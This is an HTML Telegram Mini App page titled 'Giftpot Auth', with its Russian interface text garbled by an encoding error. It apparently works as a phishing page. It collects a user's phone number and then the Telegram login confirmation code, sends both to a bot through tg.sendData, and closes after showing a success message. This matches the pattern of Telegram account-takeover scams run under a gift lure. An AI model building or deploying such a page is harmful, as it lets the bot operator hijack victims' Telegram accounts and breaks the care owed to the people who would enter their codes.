<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Giftpot Auth</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #60a5fa 0%, #3b82f6 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 24px;
            padding: 32px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
        }
        h1 {
            font-size: 28px;
            margin-bottom: 8px;
            color: #1e293b;
        }
        p {
            color: #64748b;
            margin-bottom: 24px;
        }
        input {
            width: 100%;
            padding: 16px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 16px;
            margin-bottom: 16px;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #3b82f6;
        }
        button {
            width: 100%;
            padding: 16px;
            background: #3b82f6;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #2563eb;
        }
        button:disabled {
            background: #cbd5e1;
            cursor: not-allowed;
        }
        .success {
            text-align: center;
        }
        .success-icon {
            font-size: 64px;
            margin-bottom: 16px;
        }
    </style>
</head>
<body>
    <div class="container" id="app">
        <div id="phone-step">
            <h1>üì± –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h1>
            <p>–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –≤ —Ñ–æ—Ä–º–∞—Ç–µ +1234567890</p>
            <input type="tel" id="phone-input" placeholder="+1234567890">
            <button onclick="sendPhone()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥</button>
        </div>

        <div id="code-step" style="display: none;">
            <h1>üîê –ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</h1>
            <p>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram</p>
            <input type="text" id="code-input" placeholder="12345">
            <button onclick="sendCode()">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
        </div>

        <div id="success-step" style="display: none;" class="success">
            <div class="success-icon">‚úÖ</div>
            <h1>–£—Å–ø–µ—à–Ω–æ!</h1>
            <p>–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞</p>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        let phoneNumber = '';

        function sendPhone() {
            const input = document.getElementById('phone-input');
            phoneNumber = input.value.trim();
            
            if (!phoneNumber || phoneNumber.length < 10) {
                tg.showAlert('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
                return;
            }

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –±–æ—Ç—É
            tg.sendData(JSON.stringify({
                action: 'send_code',
                phone: phoneNumber
            }));

            // –ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ –≤–≤–æ–¥—É –∫–æ–¥–∞
            document.getElementById('phone-step').style.display = 'none';
            document.getElementById('code-step').style.display = 'block';
        }

        function sendCode() {
            const input = document.getElementById('code-input');
            const code = input.value.trim();
            
            if (!code || code.length < 4) {
                tg.showAlert('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –∫–æ–¥');
                return;
            }

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –±–æ—Ç—É
            tg.sendData(JSON.stringify({
                action: 'verify_code',
                code: code,
                phone: phoneNumber
            }));

            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É—Å–ø–µ—Ö
            document.getElementById('code-step').style.display = 'none';
            document.getElementById('success-step').style.display = 'block';

            // –ó–∞–∫—Ä—ã–≤–∞–µ–º –º–∏–Ω–∏-–∞–ø–ø —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
            setTimeout(() => {
                tg.close();
            }, 2000);
        }
    </script>
</body>
</html>
